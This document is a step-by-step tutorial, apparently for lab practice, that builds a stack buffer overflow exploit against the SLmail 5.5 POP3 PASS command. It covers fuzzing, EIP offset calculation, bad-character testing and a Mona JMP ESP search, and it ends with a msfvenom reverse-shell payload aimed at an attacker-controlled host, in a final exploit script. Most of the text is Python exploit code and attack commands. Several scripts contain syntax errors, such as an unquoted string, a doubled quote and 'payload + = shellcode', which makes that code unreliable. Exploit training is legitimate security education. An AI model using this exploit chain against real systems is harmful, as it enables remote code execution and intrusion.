# Windows Bufferoverflow

In this section, there are two registers to remember:

    ESP - Extended Stack Pointer
        push and pop values
    EIP - Extended Instruction Pointer
        holds the current address location for the instruction being executed at any given time

Here I will demostarte the Buffer overflow on Seattle Lab Mail (SLmail) 5.5, download the vulnerable version from here:
https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe

During the practice I used Immunity Debugger with Mona Script.

Download Immunity Debugger:
https://www.immunityinc.com/products/debugger/

Download Mona:
https://github.com/corelan/mona

## Fuzzing buffer

Firstly, I used the following pop3-pass-fuzzer.py script template to fuzz application and discover how many bytes crash the application:

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer=["A"]
counter=100

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    try:
        print "Fuzzing PASS with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('127.0.0.1',110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
    except:
        print "Could not connect to POP3!"
```

In this case I used for SLMail application but you can change it depend on your application.


## Replicate the Crash

Let's says our output from fuzzing script:

```
root@kali:~ # ./pop3-pass-fuzzer.py
Fuzzing PASS with 1 bytes
...
Fuzzing PASS with 2700 bytes
Fuzzing PASS with 2900 bytes
```

That's mean when buffer reaches approximately 2700 bytes in length application crash.

So our exploit to replicate crash for our will be as following:

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = A * 2700

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

## Controlling EIP

At this stage we overwritten the the Extended Instruction Pointer (EIP) register with our input buffer of A’s (\x41).
Now we need to swap our A's with a unique string of 2700 bytes using the pattren_create.rb tool in Kali:

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5...
```

Copy the unique string to our exploit instend of the A's input as following:

```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5....."

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

In the debugger, we could see EIP register has been overwritten with the hex bytes 39694438. 
Let's calculate the offset using pattren_offset.rb tool in Kali:

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438
[*] Exact match at offset 2606
```
The offset 2606 means that those bytes (out of the 2700 paylod) left us 4 bytes to overwrite the EIP address.
Let’s translate this to a new modified buffer string in our exploit:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "A" * 2606
payload += "B" * 4
payload += "C" * (2700 - 2606 - 4)

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
``` 

Now if we watch the EIP register, we could see that The EIP register is cleanly
overwritten by B's (\x42).

## Add space for shellcode

We can see that ESP register points directly to the beginning of our buffer of C's, but the  shellcode requires ~350-400 bytes of space and the 90 bytes of our space won't be enough.

Let's increse the total buffer from 2700 to 3500 and make larger buffer space for our shellcode:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "A" * 2606
payload += "B" * 4
payload += "C" * (3500 - 2606 - 4)

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

## Detection of Bad Characters

There may be certain characters that are considered bad and shouldn't be used in our buffer,
return address, or shellcode such as NULL byte (\x00), CR return character (\x0d) and LF line feed (\x0a).

To test which characters are bad we will send the following badchars array with our exploit:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = "A" * 2606
payload += "B" * 4
#payload += "C" * (3500 - 2606 - 4)
payload += badchars

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

In the debugger, look at memory location at ESP we could see that \x00, \x0a and \x0d are trancated our buffer and not appear correctly in our memory location.

*NOTE:* This process should repeat as long as no bad characters are return.


## Redirect Execution Flow

In this last part, we need to try to get the EIP to point to ESP by using JMP ESP technique.

While application paused in debugger we will use Mona script to locate loaded modules using the command:

```
!mona moduels
```

The output should contain list of DLLs and EXEs application may use. We need to locate libaries with no memory protections (ASLR, DEP or Stack Canaries) and it's range does not contain bad chars. In our case we found SLMFC.DLL which has no memory protections.

Next step is locate a JMP ESP opcode (\xff\xe4) address in this DLL using the following Mona command:

```
!mona find -s "\xff\xe4" -m SLMFC.DLL
```

Put a breakpoint on this instruction address 5F4A358F (using F2) and update our exploit:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload = "A" * 2606
payload += ""\x8f\x35\x4a\x5f"
payload += "C" * (3500 - 2606 - 4)

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```

*NOTE:* The return address is written in little-endian format (reversely).

## Shellcode

We will create our shellcode using msfvenom by avoiding the bad chars (\x00\x0a\x0d) we found as following:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<MY_ATTACKER_IP> LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

This will create us encoded, bad chars free shellcode in 351 bytes long. Finally, our final exploit will look like:

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("GENERATED SHELLCODE")

payload = "A" * 2606
payload += ""\x8f\x35\x4a\x5f"
payload + = shellcode
payload += "C" * (3500 - 2606 - 4 - 351)

print "\nSending evil buffer..."
s.connect(('127.0.0.1',110))
s.recv(1024)
s.send('USER username' + '\r\n')
s.recv(1024)
s.send('PASS ' + payload + '\r\n')
print "\nDone!."
```


